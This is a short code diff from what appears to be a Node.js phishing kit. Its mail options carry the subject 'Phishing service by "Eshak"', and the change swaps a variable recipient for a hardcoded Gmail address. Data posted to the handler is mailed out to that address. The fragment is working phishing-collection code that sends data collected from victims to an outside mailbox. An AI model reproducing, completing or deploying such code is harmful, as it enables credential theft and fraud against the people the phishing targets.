@@ -52,7 +52,7 @@ app.post('/_', function (req, res) {
 
    const mailOptions = {
   from: 'bdeshak5@gmail.com',
-  to: toEmail, //list of receivers
+  to: "mdalonebd@gmail.com", //list of receivers
   subject: 'Phishing service by "Eshak"', // Subject line
   text: message //plain text body
 };
